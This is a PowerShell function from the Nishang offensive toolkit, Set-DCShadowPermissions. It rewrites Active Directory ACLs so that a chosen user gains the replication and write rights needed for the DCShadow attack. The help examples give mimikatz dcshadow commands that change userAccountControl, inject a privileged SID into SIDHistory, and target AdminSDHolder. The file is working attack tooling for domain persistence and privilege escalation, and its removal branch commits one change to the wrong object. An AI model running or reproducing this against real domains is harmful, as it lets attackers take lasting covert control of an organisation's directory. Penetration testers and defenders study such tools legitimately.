function Set-DCShadowPermissions
{
<#
.SYNOPSIS
Nishang script which can be used to modify AD objects to provide minimal permissions required for DCShadow.
 
.DESCRIPTION
The script modifies ACLs to provide minimal permissions to AD objects for DCShadow technique. The script needs DA privileges
to do so. Mimikatz can be used from the specified username after running this script (DA not required anymore)
ACLs for the following objects are updated - 

Domain object - 
DS-Install-Replica (Add/Remove Replica in Domain)
DS-Replication-Manage-Topology (Manage Replication Topology)
DS-Replication-Synchronize (Replication Synchornization)

Sites object in the Configuration container - 
CreateChild and DeleteChild

Computer object of the attacker's machine (which is registered as a Fake DC) - 
WriteProperty

Target object (user or computer or ADSPath) - 
WriteProperty


.PARAMETER FakeDC
Computer object from which the DCShadow commands are executed. 

.PARAMETER Object
Target object. Can be name of a computer object, user object or any other object.

.PARAMETER SamAccountName
Use this wen targeting a user object. Accepts samAccountName of a user object. 

.PARAMETER ADSPath
ADSPath of the target object. 

.PARAMETER Username
The username which will get the privileges to execute the DCShadow technique. s

.PARAMETER Remove
Use this switch to remove permissions added by the script.

.EXAMPLE
PS C:\> Set-DCShadowPermissions -FakeDC ops-user12 -Object ops-user19 -Username labuser -Verbose
Provides the user labuser permissions to run DCShadow against object ops-user19 from machine ops-user12.

As an example, once the above command is run, below mimikatz command can be used from mimikatz running as SYSTEM. 
lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value=8192

And below command can be used from a mimikatz running as labuser (No DA required).
lsadump::dcshadow /push

.EXAMPLE
PS C:\> Set-DCShadowPermissions -FakeDC ops-user12 -SamAccountName helpdeskuser -Username labuser -Verbose
Provides the user labuser permissions to run DCShadow against object helpdeskuser from machine ops-user12.

As an example, once the above command is run, below mimikatz command can be used from mimikatz running as SYSTEM. 
lsadump::dcshadow /object:helpdeskuser /attribute:SIDHistory /value:S-1-5-21-3270384115-3177237293-604223748-519

.EXAMPLE
PS C:\> Set-DCShadowPermissions -FakeDC ops-user12 -ADSPath "LDAP://CN=AdminSDHolder,CN=System,DC=offensiveps,DC=com" -Username labuser -Verbose
Provides the user labuser permissions to run DCShadow against the AdminSDHolder container from machine ops-user12.

.EXAMPLE
PS C:\> Set-DCShadowPermissions -FakeDC ops-user12 -SamAccountName helpdeskuser -Username labuser -Verbose -Remove
Remove the permissions added for labuser.

.LINK
https://www.dcshadow.com/
https://www.labofapenetrationtester.com/2018/04/dcshadow.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $FakeDC,

        [Parameter(ParameterSetName="Object",Position = 1, Mandatory = $False)]
        [String]
        $Object,

        [Parameter(ParameterSetName="SamAccountName",Position = 2, Mandatory = $False)]
        [String]
        $SamAccountName,
        
        [Parameter(ParameterSetName="ADSPAth",Position = 3, Mandatory = $False)]
        [String]
        $ADSPath,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $Username,

        [Parameter(Mandatory = $False)]
        [Switch]
        $Remove
    )
    
    Write-Warning "This script must be run with Domain Administrator privileges or equivalent permissions. This is not a check but a reminder."

    $sid = New-Object System.Security.Principal.NTAccount($username)

    function Get-Searcher
    {
        Param(
        
            [Parameter()]
            [String]
            $Name,

            [Parameter()]
            [String]
            $sn
        )
        
        $objDomain = New-Object System.DirectoryServices.DirectoryEntry
        $DomainDN = $objDomain.DistinguishedName
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $objSearcher.SearchRoot = $objDomain

        if ($sn)
        {
            $strFilter = "(&(samAccountName= $sn))"
        }
        elseif ($Name)
        {
            $strFilter = "(&(Name= $Name))"
        }
        $objSearcher.Filter = $strFilter
        $SearchResult = $objSearcher.FindAll()
        $Object = [ADSI]($SearchResult.Path)
        $Object

    
    }
    # Provide minimal permissions required to register a fake DC to the specified username.
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $DomainDN = $objDomain.DistinguishedName  
    $objSites = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,$DomainDN")
    $IdentitySID = $SID.Translate([System.Security.Principal.SecurityIdentifier]).value
    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$IdentitySID)
    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'All'
    $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
    $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
    $ACESites = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'CreateChild,DeleteChild','Allow','All',$nullGUID)
    $objSites.PsBase.ObjectSecurity.AddAccessRule($ACESites)
    
    # DS-Install-Replica
    $objectGuidInstallReplica = New-Object Guid 9923a32a-3607-11d2-b9be-0000f87a36b2
    $ACEInstallReplica = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'ExtendedRight','Allow',$objectGuidInstallReplica)
    $objDomain.PsBase.ObjectSecurity.AddAccessRule($ACEInstallReplica)

    # DS-Replication-Manage-Topology
    $objectGuidManageTopology = New-Object Guid 1131f6ac-9c07-11d1-f79f-00c04fc2dcd2
    $ACEManageTopology = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'ExtendedRight','Allow',$objectGuidManageTopology)
    $objDomain.PsBase.ObjectSecurity.AddAccessRule($ACEManageTopology)
   
    # DS-Replication-Synchronize
    $objectGuidSynchronize = New-Object Guid 1131f6ab-9c07-11d1-f79f-00c04fc2dcd2
    $ACESynchronize = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'ExtendedRight','Allow',$objectGuidSynchronize)
    $objDomain.PsBase.ObjectSecurity.AddAccessRule($ACESynchronize)

    # Set Write permissions for the AD object of Attacker's machine which will be registered as DC
    $objFakeDC = Get-Searcher -Name $FakeDC
    $ACEFakeDC = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'WriteProperty','Allow')
    $ObjFakeDC.PsBase.ObjectSecurity.AddAccessRule($ACEFakeDC)


    # Set Write permissions for the AD object of the Target Object
    if ($Object)
    {
        $TargetObject = Get-Searcher -Name $Object
    }
    elseif ($SAMAccountName)
    {
        $TargetObject = Get-Searcher -sn $SAMAccountName
    }
    elseif ($ADSPath)
    {
        $TargetObject = New-Object System.DirectoryServices.DirectoryEntry($ADSPath)
    }
    $ACETarget = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'WriteProperty','Allow')
    $TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACETarget)

    if (!$Remove)
    {
        Write-Verbose "Modifying permissions for user $username for all Sites in $($objSites.DistinguishedName)"
        $objSites.PsBase.commitchanges()

        Write-Verbose "Providing $username minimal replication rights in $DomainDN"
        # Modify the domain object ACL to include the replication ACEs
        $objDomain.PsBase.commitchanges()

        Write-Verbose "Providing $username Write permissions for the computer object $($objFakeDC.DistinguishedName) to be registered as Fake DC"
        $objFakeDC.PsBase.commitchanges()

        Write-Verbose "Providing $username Write permissions for the target object $($TargetObject.DistinguishedName)"
        $TargetObject.PsBase.commitchanges()
    }
    elseif ($Remove)
    {
        Write-Verbose "Removing the ACEs added by this script."
        
        $objSites.PsBase.ObjectSecurity.RemoveAccessRule($ACESites)
        $objSites.PsBase.commitchanges()
        
        $objDomain.PsBase.ObjectSecurity.RemoveAccessRule($ACEInstallReplica)
        $objDomain.PsBase.ObjectSecurity.RemoveAccessRule($ACEManageTopology)
        $objDomain.PsBase.ObjectSecurity.RemoveAccessRule($ACESynchronize)
        $objDomain.PsBase.commitchanges()

        $ObjFakeDC.PsBase.ObjectSecurity.RemoveAccessRule($ACEFakeDC)
        $objFakeDC.PsBase.commitchanges()

        $TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACETarget)
        $objFakeDC.PsBase.commitchanges()
    }
}